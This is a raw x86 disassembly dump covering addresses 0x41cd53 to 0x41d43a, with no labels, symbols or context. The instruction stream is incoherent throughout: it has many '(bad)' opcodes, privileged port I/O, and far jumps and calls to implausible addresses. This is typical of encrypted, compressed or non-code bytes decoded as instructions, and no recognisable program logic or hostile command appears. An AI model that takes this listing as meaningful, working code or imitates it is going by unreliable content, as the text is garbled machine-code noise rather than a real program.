  41cd53:	ds push ss
  41cd55:	fwait
  41cd56:	pop    edi
  41cd57:	mov    ah,BYTE PTR [ecx-0x7168d10]
  41cd5d:	jb     0x41cd0c
  41cd5f:	mov    ds,edi
  41cd61:	callw  0x90ad
  41cd65:	add    BYTE PTR [eax-0x9],cl
  41cd68:	or     ebp,DWORD PTR [eax]
  41cd6a:	fcmovb st,st(6)
  41cd6c:	sbb    DWORD PTR [ecx],ebx
  41cd6e:	cmc    
  41cd6f:	mov    dl,bl
  41cd71:	fld    DWORD PTR [ecx+0x2de4e7e0]
  41cd77:	cmp    ah,al
  41cd79:	mov    cl,0xf5
  41cd7b:	mov    esp,0x7e9affcb
  41cd80:	mov    al,ds:0xc1a7d590
  41cd85:	cli    
  41cd86:	mov    ecx,0x888c2d73
  41cd8b:	cmp    al,0x67
  41cd8d:	int    0xc9
  41cd8f:	sti    
  41cd90:	jb     0x41cd6e
  41cd92:	mov    esp,0xca8606cb
  41cd97:	aam    0xa4
  41cd99:	jecxz  0x41cd7c
  41cd9b:	mov    edx,0xcacf1432
  41cda0:	sbb    DWORD PTR [ebx-0x48],ebp
  41cda3:	pop    ds
  41cda4:	call   0x2a24a527
  41cda9:	xor    esp,esi
  41cdab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdac:	mov    ebx,esp
  41cdae:	in     eax,dx
  41cdaf:	add    al,0xfd
  41cdb2:	sbb    BYTE PTR [ecx+0x7b627d0e],dl
  41cdb8:	repnz xor eax,ebx
  41cdbb:	xchg   esi,eax
  41cdbc:	xor    BYTE PTR [eax],dh
  41cdbe:	fs inc ebx
  41cdc0:	sbb    edi,eax
  41cdc2:	pop    edx
  41cdc3:	loope  0x41cd8d
  41cdc5:	jno    0x41ce22
  41cdc7:	push   ecx
  41cdc8:	pop    ecx
  41cdc9:	(bad)  
  41cdca:	xchg   esp,eax
  41cdcb:	es push 0xffffff97
  41cdce:	xchg   DWORD PTR [ebp+0x5d723510],edx
  41cdd4:	push   ebx
  41cdd5:	cmp    esp,DWORD PTR ds:0xfa3a1875
  41cddb:	cmp    BYTE PTR [ecx],al
  41cddd:	in     eax,dx
  41cdde:	ret    0xf28d
  41cde1:	cmp    ch,bl
  41cde3:	in     al,dx
  41cde4:	xlat   BYTE PTR ds:[ebx]
  41cde5:	cmc    
  41cde6:	iret   
  41cde7:	outs   dx,DWORD PTR ds:[esi]
  41cde8:	and    ecx,DWORD PTR [edi+edi*1+0x5635277f]
  41cdef:	ror    dh,0xfb
  41cdf2:	mov    bh,0x21
  41cdf4:	mov    al,0xd
  41cdf6:	mov    bh,0xae
  41cdf8:	test   DWORD PTR [esi-0x42725b1a],edi
  41cdfe:	pop    ebp
  41cdff:	mov    cl,BYTE PTR [ebp+0x3b79bb4f]
  41ce05:	add    eax,esi
  41ce07:	and    BYTE PTR [ebp-0xa],0x22
  41ce0b:	lods   eax,DWORD PTR ds:[esi]
  41ce0c:	fadd   st(4),st
  41ce0e:	clc    
  41ce0f:	mov    ch,0xe7
  41ce11:	xor    DWORD PTR [ebx-0x80],esp
  41ce14:	sub    BYTE PTR [edx],dl
  41ce16:	cwde   
  41ce17:	xchg   ecx,eax
  41ce18:	add    al,0xd4
  41ce1a:	inc    ebx
  41ce1b:	sub    dl,BYTE PTR [ecx+0x11d93e37]
  41ce21:	scas   al,BYTE PTR es:[edi]
  41ce22:	adc    esp,ebx
  41ce24:	shl    BYTE PTR [eax-0x56],0x27
  41ce28:	mov    al,0x41
  41ce2a:	inc    BYTE PTR [edi+0x1752cb2b]
  41ce30:	lods   al,BYTE PTR ds:[esi]
  41ce31:	stc    
  41ce32:	fcmovb st,st(5)
  41ce34:	popf   
  41ce35:	(bad)  
  41ce36:	rcl    BYTE PTR [edi],cl
  41ce38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce39:	inc    edx
  41ce3a:	test   eax,0xf71aab6e
  41ce3f:	fwait
  41ce40:	jge    0x41ce94
  41ce42:	or     edi,edi
  41ce44:	push   ebp
  41ce45:	push   cs
  41ce46:	jne    0x41cebd
  41ce48:	dec    esp
  41ce49:	sub    al,0xc1
  41ce4b:	jmp    0x41ce60
  41ce4d:	xlat   BYTE PTR ds:[ebx]
  41ce4e:	inc    ecx
  41ce4f:	xchg   sp,ax
  41ce51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce52:	sti    
  41ce53:	lahf   
  41ce54:	repz jo 0x41cebe
  41ce57:	sub    edx,ebx
  41ce59:	jecxz  0x41ce89
  41ce5b:	sbb    bl,BYTE PTR [edi-0x71]
  41ce5e:	ins    DWORD PTR es:[edi],dx
  41ce5f:	or     eax,0xae4034bf
  41ce64:	lods   eax,DWORD PTR ds:[esi]
  41ce65:	aas    
  41ce66:	add    ebp,DWORD PTR [edx+0x42d72d9a]
  41ce6c:	push   ss
  41ce6d:	fist   DWORD PTR [ecx+eax*8]
  41ce70:	sbb    eax,edi
  41ce72:	jle    0x41ce08
  41ce74:	fwait
  41ce75:	test   BYTE PTR [esi-0x10c003b6],bh
  41ce7b:	mov    dl,0x48
  41ce7d:	out    dx,eax
  41ce7e:	dec    eax
  41ce7f:	dec    ebp
  41ce80:	(bad)  
  41ce81:	sti    
  41ce82:	pop    eax
  41ce83:	retf   
  41ce84:	leave  
  41ce85:	scas   eax,DWORD PTR es:[edi]
  41ce86:	dec    ebp
  41ce87:	fsub   QWORD PTR [edx-0x1d38480e]
  41ce8d:	jge    0x41ce7b
  41ce8f:	int3   
  41ce90:	idiv   BYTE PTR cs:0x97fac6f0
  41ce97:	int3   
  41ce98:	jp     0x41ce30
  41ce9a:	sub    ecx,DWORD PTR [ecx-0x4c]
  41ce9d:	iret   
  41ce9e:	inc    edi
  41ce9f:	les    esi,FWORD PTR [ebp-0xb46db26]
  41cea5:	pop    edx
  41cea6:	test   DWORD PTR [ebx+0x6664dd71],esp
  41ceac:	push   ebx
  41cead:	retf   0xad6a
  41ceb0:	and    eax,0x895e4487
  41ceb5:	or     eax,DWORD PTR [ecx-0x66]
  41ceb8:	inc    eax
  41ceb9:	stos   DWORD PTR es:[edi],eax
  41ceba:	out    0x39,eax
  41cebc:	fbld   TBYTE PTR [ebx+0x37]
  41cebf:	rcl    DWORD PTR [ebp-0x1d],cl
  41cec2:	add    esi,DWORD PTR [esi-0x31]
  41cec5:	push   edi
  41cec6:	aam    0x5
  41cec8:	lea    edx,[ecx-0x1695be3b]
  41cece:	mov    bl,0x23
  41ced0:	stos   DWORD PTR es:[edi],eax
  41ced1:	add    esi,DWORD PTR [ebx-0x1a]
  41ced4:	push   ss
  41ced5:	sub    esi,esi
  41ced7:	mov    bh,0x3b
  41ced9:	outs   dx,DWORD PTR ds:[esi]
  41ceda:	stc    
  41cedb:	fwait
  41cedc:	xchg   ecx,eax
  41cedd:	out    0xbe,eax
  41cedf:	cmp    ebx,DWORD PTR ds:0xf8a06247
  41cee5:	dec    ebp
  41cee6:	loopne 0x41ceeb
  41cee8:	jnp    0x41ceeb
  41ceea:	mov    bl,0x43
  41ceec:	imul   esp,DWORD PTR [ebx+0x6960fc88],0xffffffb5
  41cef3:	add    BYTE PTR [eax+0x16b6d832],bl
  41cef9:	inc    ecx
  41cefa:	xor    al,0xd6
  41cefc:	fcomp  DWORD PTR [ebx]
  41cefe:	das    
  41ceff:	pushf  
  41cf00:	xchg   edi,eax
  41cf01:	rcl    DWORD PTR [edi+0x533356ea],1
  41cf07:	jl     0x41cf4a
  41cf09:	jmp    0x4dfed1fd
  41cf0e:	ja     0x41cec0
  41cf10:	fs test eax,0x65e97fba
  41cf16:	xchg   edx,eax
  41cf17:	repz mov bh,ah
  41cf1a:	push   0x6f
  41cf1c:	adc    al,0xa0
  41cf1e:	inc    edx
  41cf1f:	in     eax,0x8a
  41cf21:	xlat   BYTE PTR ds:[ebx]
  41cf22:	xor    edx,0xa6fe5d38
  41cf28:	sbb    bh,BYTE PTR [ebp+0x336a6bee]
  41cf2e:	arpl   WORD PTR gs:[ebp-0x19],bx
  41cf32:	cmp    bl,0xd2
  41cf35:	dec    esi
  41cf36:	jno    0x41cf0a
  41cf38:	push   ss
  41cf39:	outs   dx,DWORD PTR ds:[esi]
  41cf3a:	inc    ecx
  41cf3b:	out    dx,al
  41cf3c:	pop    esp
  41cf3d:	sub    eax,0xc584c683
  41cf42:	inc    ebp
  41cf43:	push   esi
  41cf44:	fnsave [eax]
  41cf46:	jp     0x41cf03
  41cf48:	popa   
  41cf49:	test   ecx,edx
  41cf4b:	retf   0x95b3
  41cf4e:	(bad)  
  41cf4f:	fcomp  DWORD PTR [ecx+0x11]
  41cf52:	add    ebp,DWORD PTR [ebx+0x51a2b9cf]
  41cf58:	add    eax,0x70914418
  41cf5d:	mov    bl,BYTE PTR [esp+eax*2-0x30]
  41cf61:	pop    es
  41cf62:	xchg   esi,eax
  41cf63:	(bad)  
  41cf64:	pusha  
  41cf65:	push   0x19
  41cf67:	pop    ebx
  41cf68:	mov    WORD PTR [ebp-0x1e],ds
  41cf6b:	jge    0x41cf8c
  41cf6d:	jl     0x41cf8b
  41cf6f:	iret   
  41cf70:	cmp    eax,0x285a2490
  41cf75:	not    DWORD PTR [eiz*4+0x3e6447f9]
  41cf7c:	scas   eax,DWORD PTR es:[edi]
  41cf7d:	lods   eax,DWORD PTR ds:[esi]
  41cf7e:	rcl    BYTE PTR [ebp-0x3f],cl
  41cf81:	adc    dl,BYTE PTR [edx-0x49]
  41cf84:	xor    BYTE PTR [ebx+0x76],bl
  41cf87:	pop    esp
  41cf88:	imul   edx,DWORD PTR [edi+0x73c849c1],0xffffffcf
  41cf8f:	jl     0x41cfcb
  41cf91:	inc    esi
  41cf92:	bound  ecx,QWORD PTR [ecx+0x55]
  41cf95:	jp     0x41cf4f
  41cf97:	ins    DWORD PTR es:[edi],dx
  41cf98:	mov    esp,0x31a0a06d
  41cf9d:	fld    QWORD PTR [ebp-0x4d426685]
  41cfa3:	(bad)  [ecx-0x78]
  41cfa6:	std    
  41cfa7:	pop    ecx
  41cfa8:	mov    edx,0x33273a24
  41cfad:	inc    ecx
  41cfae:	add    BYTE PTR [eax],al
  41cfb0:	add    BYTE PTR [eax],al
  41cfb2:	jnp    0x41cf7d
  41cfb4:	xor    bh,0xb2
  41cfb7:	(bad)  
  41cfb8:	jg     0x41cf87
  41cfba:	sbb    DWORD PTR [esp+esi*1-0x5b],0xfcf45e8e
  41cfc2:	pop    ecx
  41cfc3:	dec    ebx
  41cfc4:	add    DWORD PTR [eax],eax
  41cfc6:	hlt    
  41cfc7:	add    al,0x0
  41cfc9:	add    BYTE PTR [ebp-0x7b5f94b9],cl
  41cfcf:	(bad)  [esi+0x44]
  41cfd2:	mov    cl,0x1b
  41cfd4:	(bad)  
  41cfd5:	pop    edx
  41cfd6:	add    bl,BYTE PTR [ecx]
  41cfd8:	jns    0x41cfe8
  41cfda:	ins    BYTE PTR es:[edi],dx
  41cfdb:	jge    0x41cf88
  41cfdd:	xor    BYTE PTR [ecx-0x297b3226],dh
  41cfe3:	pop    edx
  41cfe4:	jl     0x41d050
  41cfe6:	retf   
  41cfe7:	mov    ah,0xd8
  41cfe9:	push   ss
  41cfea:	jne    0x41d02f
  41cfec:	stos   BYTE PTR es:[edi],al
  41cfed:	pop    ecx
  41cfee:	imul   ebp,edi,0xfffffff6
  41cff1:	mov    dl,0x4c
  41cff3:	outs   dx,DWORD PTR ds:[esi]
  41cff4:	inc    edx
  41cff5:	mov    esp,0x20c921bc
  41cffa:	inc    edi
  41cffb:	fwait
  41cffc:	icebp  
  41cffd:	retf   
  41cffe:	mov    al,0x6
  41d000:	push   ss
  41d001:	cmp    DWORD PTR [ebp-0x6b],eax
  41d004:	stos   DWORD PTR es:[edi],eax
  41d005:	mov    ecx,0x1600e8e1
  41d00a:	pop    esp
  41d00b:	mulps  xmm7,XMMWORD PTR ds:0xbd09dd51
  41d012:	push   eax
  41d013:	mov    esp,0xeef68e20
  41d018:	test   DWORD PTR [edx+eiz*1],ebp
  41d01b:	jns    0x41d018
  41d01d:	out    dx,al
  41d01e:	into   
  41d01f:	inc    ebx
  41d020:	fwait
  41d021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d022:	inc    edi
  41d023:	lea    edi,[eax-0x6105f9fc]
  41d029:	mov    ch,0x59
  41d02b:	les    ebp,FWORD PTR [ebx-0x1c]
  41d02e:	stos   BYTE PTR es:[edi],al
  41d02f:	cmp    edi,edx
  41d031:	lods   eax,DWORD PTR ds:[esi]
  41d032:	scas   al,BYTE PTR es:[edi]
  41d033:	add    DWORD PTR [ebx+0x7c],0x6a0c7917
  41d03a:	dec    ebx
  41d03b:	adc    DWORD PTR [ecx],0xffffffde
  41d03e:	cmp    bl,BYTE PTR [edi]
  41d040:	ja     0x41d036
  41d042:	out    dx,eax
  41d043:	scas   al,BYTE PTR es:[edi]
  41d044:	jge    0x41cfed
  41d046:	mov    BYTE PTR [ecx-0x674d187e],bh
  41d04c:	call   FWORD PTR [ecx+0xbc9904f]
  41d052:	mov    ds:0x86b426e5,al
  41d057:	nop
  41d058:	sub    esi,esp
  41d05a:	test   al,0x5e
  41d05c:	add    al,0x92
  41d05e:	and    DWORD PTR [ebx+0x6b],eax
  41d061:	leave  
  41d062:	les    ebx,FWORD PTR [ebp+0x24]
  41d065:	dec    edi
  41d066:	fsub   DWORD PTR [edi]
  41d068:	jecxz  0x41d044
  41d06a:	jno    0x41d003
  41d06c:	sub    esp,DWORD PTR [ecx]
  41d06e:	addr16 pop ecx
  41d070:	cs pusha 
  41d072:	and    eax,0x4b2a9ac7
  41d077:	add    DWORD PTR [ebx-0x6b],eax
  41d07a:	pop    edi
  41d07b:	sbb    DWORD PTR [eax+0x6c],esi
  41d07e:	add    al,0x6a
  41d080:	xchg   esi,eax
  41d081:	ja     0x41d05b
  41d083:	jnp    0x41d06c
  41d085:	(bad)
  41d08a:	lea    eax,[ebp-0x6b]
  41d08d:	idiv   dh
  41d08f:	or     esp,DWORD PTR [edx-0x50]
  41d092:	iret   
  41d093:	mov    al,BYTE PTR ds:0x8d66ae50
  41d099:	das    
  41d09a:	fimul  WORD PTR [eax-0xd]
  41d09d:	daa    
  41d09e:	pushf  
  41d09f:	aaa    
  41d0a0:	ins    DWORD PTR es:[edi],dx
  41d0a1:	(bad)  
  41d0a2:	fbstp  TBYTE PTR [ecx+0x74]
  41d0a5:	ins    DWORD PTR es:[edi],dx
  41d0a6:	repz mov es,WORD PTR [edi+esi*8-0x54]
  41d0ab:	ins    DWORD PTR es:[edi],dx
  41d0ac:	add    BYTE PTR [edi],cl
  41d0ae:	(bad)  
  41d0af:	out    0xc4,eax
  41d0b1:	sbb    esi,DWORD PTR [ecx-0x2f2eb3b4]
  41d0b7:	dec    eax
  41d0b8:	mov    DWORD PTR [edx+esi*8+0x49f2bdc9],esi
  41d0bf:	jb     0x41d09c
  41d0c1:	mov    ecx,0x39e1fd8f
  41d0c6:	push   ebx
  41d0c7:	xchg   DWORD PTR [esi-0x5e6e4090],edx
  41d0cd:	dec    ebp
  41d0ce:	and    BYTE PTR [ecx+0x4d],ch
  41d0d1:	mov    esp,0xa3ec0bdb
  41d0d6:	inc    edi
  41d0d7:	xor    dl,ch
  41d0d9:	xor    ch,cl
  41d0db:	add    dh,bh
  41d0dd:	fdivr  QWORD PTR [edi-0x3dcab3ae]
  41d0e3:	push   ss
  41d0e4:	push   edx
  41d0e5:	fwait
  41d0e6:	sahf   
  41d0e7:	fild   WORD PTR [esi+0x1d]
  41d0ea:	mov    eax,0xb010dc65
  41d0ef:	out    dx,al
  41d0f0:	or     edx,DWORD PTR [ebx+0x1609ba79]
  41d0f6:	push   es
  41d0f7:	addr16 mov dh,0x34
  41d0fa:	les    ebp,FWORD PTR [edi-0x2f]
  41d0fd:	je     0x41d0f7
  41d0ff:	lahf   
  41d100:	nop    ebx
  41d103:	pop    esp
  41d104:	ficom  DWORD PTR [ebp-0x4a2e96b8]
  41d10a:	push   cs
  41d10b:	je     0x41d0e4
  41d10d:	inc    ecx
  41d10e:	aad    0xae
  41d110:	hlt    
  41d111:	add    BYTE PTR [edi+0x36],dl
  41d114:	mov    ch,0x61
  41d116:	jbe    0x41d09c
  41d118:	dec    esp
  41d119:	ret    
  41d11a:	jmp    0x9450ba70
  41d11f:	sahf   
  41d120:	jmp    0x41d0af
  41d122:	jns    0x41d0b6
  41d124:	out    dx,eax
  41d125:	push   ebp
  41d126:	imul   ebp,DWORD PTR [edx+0x47],0x921df28e
  41d12d:	add    eax,0x54322177
  41d132:	push   edi
  41d133:	loope  0x41d0d6
  41d135:	pop    ebx
  41d136:	cmc    
  41d137:	mov    edx,0x547b42a1
  41d13c:	sub    DWORD PTR [ebx+0x12],edi
  41d13f:	xor    BYTE PTR [ebx],bh
  41d141:	cld    
  41d142:	rcl    BYTE PTR [esi-0x33],cl
  41d145:	dec    edi
  41d146:	inc    eax
  41d147:	dec    ecx
  41d148:	mov    fs,WORD PTR [edx]
  41d14a:	mov    ch,0x45
  41d14c:	jo     0x41d106
  41d14e:	pop    ecx
  41d14f:	std    
  41d150:	cmc    
  41d151:	xchg   ebx,eax
  41d152:	push   0x34
  41d154:	inc    eax
  41d155:	sahf   
  41d156:	retf   0xab66
  41d159:	xchg   dh,al
  41d15b:	das    
  41d15c:	sti    
  41d15d:	push   cs
  41d15e:	scas   al,BYTE PTR es:[edi]
  41d15f:	xor    ebx,DWORD PTR [eax-0xe]
  41d162:	outs   dx,BYTE PTR ds:[esi]
  41d163:	dec    esp
  41d164:	icebp  
  41d165:	xor    al,bh
  41d167:	sahf   
  41d168:	mov    eax,0x2f847e2
  41d16d:	mov    ebp,0x21c43fe1
  41d172:	dec    ecx
  41d173:	mov    edx,0x5850f846
  41d178:	mov    ecx,0x2a4ce8ce
  41d17d:	jns    0x41d1db
  41d17f:	fwait
  41d180:	jns    0x41d110
  41d182:	stos   DWORD PTR es:[edi],eax
  41d183:	push   ss
  41d184:	sti    
  41d185:	push   ds
  41d186:	xlat   BYTE PTR ds:[ebx]
  41d187:	nop
  41d188:	mov    ecx,0x44428bef
  41d18d:	in     eax,0xfa
  41d18f:	push   ds
  41d190:	xchg   ecx,esi
  41d192:	lods   al,BYTE PTR ds:[esi]
  41d193:	pop    es
  41d194:	xchg   ebx,eax
  41d195:	stos   DWORD PTR es:[edi],eax
  41d196:	xlat   BYTE PTR ds:[ebx]
  41d197:	fwait
  41d198:	inc    ebp
  41d199:	fadd   DWORD PTR [edi]
  41d19b:	cdq    
  41d19c:	bound  edx,QWORD PTR [esi]
  41d19e:	or     al,0x4c
  41d1a0:	(bad)  
  41d1a1:	(bad)  
  41d1a2:	cmp    ch,cl
  41d1a4:	and    DWORD PTR [edi-0x2aa24978],0x1bde48b2
  41d1ae:	pop    ds
  41d1af:	test   al,0x9b
  41d1b1:	sub    eax,0xe59c74f2
  41d1b6:	adc    edx,DWORD PTR [ebx-0x1e0056c]
  41d1bc:	packssdw mm6,QWORD PTR [ebx+0x16]
  41d1c0:	les    edx,FWORD PTR [edx-0x5f928e15]
  41d1c6:	mov    ebp,0xdacbd0cd
  41d1cb:	cli    
  41d1cc:	mov    es,ebx
  41d1ce:	fisttp DWORD PTR [ebx+eiz*4]
  41d1d1:	(bad)  
  41d1d2:	daa    
  41d1d3:	(bad)  
  41d1d4:	sbb    ch,BYTE PTR [edx]
  41d1d6:	bound  esi,QWORD PTR [ebx+ebx*2-0x79]
  41d1da:	in     eax,dx
  41d1db:	jle    0x41d234
  41d1dd:	xchg   ecx,eax
  41d1de:	jmp    0x41ce:0x6915f9e8
  41d1e5:	aas    
  41d1e6:	mov    bl,0xf
  41d1e8:	call   FWORD PTR [esi-0x2410651d]
  41d1ee:	outs   dx,BYTE PTR ds:[esi]
  41d1ef:	xchg   edi,eax
  41d1f0:	jnp    0x41d1c0
  41d1f2:	mov    ecx,0x5a691a8b
  41d1f7:	mov    al,0xe8
  41d1f9:	lahf   
  41d1fa:	or     al,0xd2
  41d1fc:	int3   
  41d1fd:	mov    esp,es
  41d1ff:	cmc    
  41d200:	gs mov ebx,0xc4f75dbd
  41d206:	mov    dl,0x60
  41d208:	jmp    0xcb4e:0xfef2861a
  41d20f:	shl    BYTE PTR [esi-0x7e],cl
  41d212:	add    BYTE PTR [ebx-0x49],bl
  41d215:	dec    edx
  41d216:	jo     0x41d1e1
  41d218:	push   ebp
  41d219:	mov    DWORD PTR [ebx],edx
  41d21b:	in     al,dx
  41d21c:	(bad)  
  41d21d:	pop    edx
  41d21f:	jno    0x41d1aa
  41d221:	sub    DWORD PTR ds:[ebx],esp
  41d224:	xor    eax,0xe12c32c7
  41d229:	outs   dx,DWORD PTR ds:[esi]
  41d22a:	fs push bx
  41d22d:	(bad)  
  41d22e:	push   ebx
  41d22f:	push   0xffffffe8
  41d231:	pusha  
  41d232:	inc    eax
  41d233:	pop    ss
  41d234:	mov    ch,0x26
  41d236:	iret   
  41d237:	addr16 gs pop ecx
  41d23a:	aas    
  41d23b:	fwait
  41d23c:	inc    edx
  41d23d:	and    eax,0xd1cfa0e4
  41d242:	and    DWORD PTR [edx+0x39],ebx
  41d245:	dec    esi
  41d246:	(bad)  
  41d247:	in     eax,0x85
  41d249:	mov    edi,gs
  41d24b:	mov    eax,ds:0x624522cd
  41d250:	push   esi
  41d251:	inc    edx
  41d252:	pop    esi
  41d253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d254:	inc    ecx
  41d255:	imul   BYTE PTR ds:0xc0839191
  41d25b:	adc    al,0x84
  41d25d:	in     al,dx
  41d25e:	sahf   
  41d25f:	ret    0x3aeb
  41d262:	shl    DWORD PTR [ebp+0x4d],cl
  41d265:	stos   DWORD PTR es:[edi],eax
  41d266:	icebp  
  41d267:	fsub   DWORD PTR [edx-0x56c540e6]
  41d26d:	pop    ss
  41d26e:	sub    al,0x8
  41d270:	cwde   
  41d271:	xlat   BYTE PTR ds:[ebx]
  41d272:	pop    edx
  41d273:	hlt    
  41d274:	and    DWORD PTR ds:0xe4868d6c,esp
  41d27a:	rcl    DWORD PTR [ebp-0x6086205b],cl
  41d280:	xchg   esp,eax
  41d281:	push   ebp
  41d282:	cmp    eax,0xdd111f3f
  41d287:	jmp    0x41d280
  41d289:	hlt    
  41d28a:	and    eax,0xe57e3357
  41d28f:	sub    DWORD PTR [edi-0x7a8f943a],edi
  41d295:	mov    bh,0xa0
  41d297:	fdiv   DWORD PTR [edx]
  41d299:	cwde   
  41d29a:	addr16 push ebx
  41d29c:	mov    ch,0x2e
  41d29e:	add    bh,BYTE PTR [ebp+0x39cb5b96]
  41d2a4:	(bad)  
  41d2a5:	out    0x37,al
  41d2a7:	xchg   esi,eax
  41d2a8:	fdiv   DWORD PTR [edi]
  41d2aa:	mov    dh,0x7a
  41d2ac:	ret    
  41d2ad:	stos   DWORD PTR es:[edi],eax
  41d2ae:	mov    ecx,0x40094ac6
  41d2b3:	pop    edx
  41d2b4:	out    0x39,al
  41d2b6:	in     al,0x4d
  41d2b8:	sbb    eax,0x4a6cbd86
  41d2bd:	mov    es,WORD PTR [eax]
  41d2bf:	push   eax
  41d2c0:	(bad)  
  41d2c1:	test   al,0x82
  41d2c3:	data16 cmp BYTE PTR ds:0xb1cc9904,0x8e
  41d2cb:	xchg   edi,eax
  41d2cc:	pop    ds
  41d2cd:	pop    esp
  41d2ce:	push   0xc
  41d2d0:	out    dx,eax
  41d2d1:	lea    esp,[eax]
  41d2d3:	ss scas eax,DWORD PTR es:[edi]
  41d2d5:	test   al,0xa3
  41d2d7:	mov    dl,0xba
  41d2d9:	jl     0x41d276
  41d2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2dc:	popa   
  41d2dd:	call   0x8c2b:0x76d0f62a
  41d2e4:	xchg   edx,eax
  41d2e5:	sti    
  41d2e6:	push   esi
  41d2e7:	pushf  
  41d2e8:	push   eax
  41d2e9:	dec    eax
  41d2ea:	(bad)  
  41d2eb:	push   cs
  41d2ec:	xor    al,0xad
  41d2ee:	or     ebp,eax
  41d2f0:	lea    esp,[esi+0x3]
  41d2f3:	pop    es
  41d2f4:	cmp    BYTE PTR [edi],al
  41d2f6:	add    BYTE PTR [eax+0x60],cl
  41d2f9:	shl    BYTE PTR [ebx-0x15c20951],cl
  41d2ff:	or     eax,0xcf76674f
  41d304:	cmp    eax,0x11268a2a
  41d309:	icebp  
  41d30a:	or     ch,BYTE PTR [esi]
  41d30c:	xlat   BYTE PTR ds:[ebx]
  41d30d:	lods   al,BYTE PTR ds:[esi]
  41d30e:	jo     0x41d342
  41d310:	das    
  41d311:	dec    esp
  41d312:	jbe    0x41d2aa
  41d314:	add    DWORD PTR [ebx-0x47410a76],esi
  41d31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d31b:	and    cl,BYTE PTR [ebp-0x2c]
  41d31e:	cmc    
  41d31f:	sbb    al,0x81
  41d321:	retf   
  41d322:	jmp    0x41d2d3
  41d324:	mov    ebp,0x597eda68
  41d329:	sbb    eax,0xd141722a
  41d32e:	mov    ch,0x27
  41d330:	in     al,dx
  41d331:	xchg   ecx,eax
  41d332:	jb     0x41d345
  41d334:	nop
  41d335:	mov    fs,edx
  41d337:	jmp    FWORD PTR [esi-0x80]
  41d33a:	push   edx
  41d33b:	inc    edi
  41d33c:	push   cs
  41d33d:	dec    ebx
  41d33e:	cdq    
  41d33f:	jae    0x41d2ca
  41d341:	in     eax,dx
  41d342:	sub    edi,DWORD PTR [eax-0x54e2a372]
  41d348:	xor    edx,DWORD PTR [edi+esi*1-0x309eda45]
  41d34f:	mov    cl,0xa5
  41d351:	adc    DWORD PTR [ecx-0x15],ebx
  41d354:	call   edi
  41d356:	pop    eax
  41d357:	scas   eax,DWORD PTR es:[edi]
  41d358:	xor    eax,0xf9eded3c
  41d35d:	stc    
  41d35e:	out    dx,eax
  41d35f:	xor    al,0x2c
  41d361:	jg     0x41d3b9
  41d363:	shr    BYTE PTR [ecx+ebx*1],cl
  41d366:	jp     0x41d336
  41d368:	xchg   ebp,eax
  41d369:	imul   edi,DWORD PTR [edx-0xf],0xffffffc8
  41d36d:	retf   
  41d36e:	(bad)  
  41d36f:	ficom  WORD PTR [edx-0x11]
  41d372:	or     al,0xd8
  41d374:	ds mov edi,0xc3fae0dc
  41d37a:	xor    eax,0xc011ca00
  41d37f:	pop    es
  41d380:	in     eax,0x82
  41d382:	jne    0x41d320
  41d384:	imul   ecx,DWORD PTR [edi-0x10],0x16c3b7f0
  41d38b:	or     al,0xed
  41d38d:	cli    
  41d38e:	add    ch,BYTE PTR [esi]
  41d390:	dec    ebx
  41d391:	das    
  41d392:	add    ecx,ebp
  41d394:	out    dx,eax
  41d395:	(bad)  
  41d396:	jnp    0x41d3fc
  41d398:	fisub  DWORD PTR [eax-0x3537455c]
  41d39e:	cld    
  41d39f:	fucomi st,st(4)
  41d3a1:	(bad)  
  41d3a2:	mov    dl,BYTE PTR ds:0x88b23046
  41d3a8:	xchg   esi,eax
  41d3a9:	adc    eax,0x9f38b1d
  41d3ae:	sub    ebp,DWORD PTR [ebp-0x2a]
  41d3b1:	outs   dx,BYTE PTR ds:[esi]
  41d3b2:	fldenv [ebp+ebx*1+0x7f]
  41d3b6:	nop
  41d3b7:	jmp    0x4fd13de8
  41d3bc:	jmp    0x41d3be
  41d3be:	and    al,0x71
  41d3c0:	in     al,dx
  41d3c1:	jns    0x41d389
  41d3c3:	iret   
  41d3c4:	inc    ebx
  41d3c5:	push   ss
  41d3c6:	loop   0x41d443
  41d3c8:	shl    DWORD PTR [ebx],cl
  41d3ca:	mov    dl,0xc9
  41d3cc:	jecxz  0x41d425
  41d3ce:	popf   
  41d3cf:	and    ebx,0xffffffd9
  41d3d2:	dec    esp
  41d3d3:	fisubr WORD PTR [edx]
  41d3d5:	mov    dl,0xcf
  41d3d7:	outs   dx,DWORD PTR ds:[esi]
  41d3d8:	in     al,0x5f
  41d3da:	pop    ebx
  41d3db:	aas    
  41d3dc:	pop    ebp
  41d3dd:	lds    edx,FWORD PTR [ebx]
  41d3df:	icebp  
  41d3e0:	dec    ebx
  41d3e1:	sahf   
  41d3e2:	jmp    0x470a:0x187bcb8f
  41d3e9:	scas   al,BYTE PTR es:[edi]
  41d3ea:	pushf  
  41d3eb:	xchg   DWORD PTR [esi+0x3136e5be],esp
  41d3f1:	test   BYTE PTR [eax],dl
  41d3f3:	xor    DWORD PTR [ebp+0x32],ebx
  41d3f6:	pushf  
  41d3f7:	rcl    DWORD PTR [ebx],0x4b
  41d3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3fb:	sbb    DWORD PTR [ecx],esp
  41d3fd:	push   cs
  41d3fe:	repnz stos DWORD PTR es:[edi],eax
  41d400:	push   eax
  41d401:	repz push es
  41d403:	adc    eax,0xef4d5c0c
  41d408:	cld    
  41d409:	dec    ecx
  41d40a:	and    eax,0x43aeecd
  41d40f:	sub    BYTE PTR [edi],0x4a
  41d412:	and    dh,BYTE PTR [ecx]
  41d414:	jle    0x41d3e0
  41d416:	xor    DWORD PTR [ecx+esi*4],edi
  41d419:	iret   
  41d41a:	scas   al,BYTE PTR es:[edi]
  41d41b:	xchg   esi,eax
  41d41c:	sbb    cl,bh
  41d41e:	in     al,dx
  41d41f:	pop    esp
  41d420:	xchg   ch,bl
  41d422:	add    edx,esp
  41d424:	xor    edi,DWORD PTR [ebp+0x27c4b990]
  41d42a:	call   0xe0:0xd3492eb0
  41d431:	sbb    eax,0xb77a2dc
  41d436:	pop    esi
  41d437:	pop    esp
  41d438:	jns    0x41d3fb
  41d43a:	mov    edi,0x58a73160
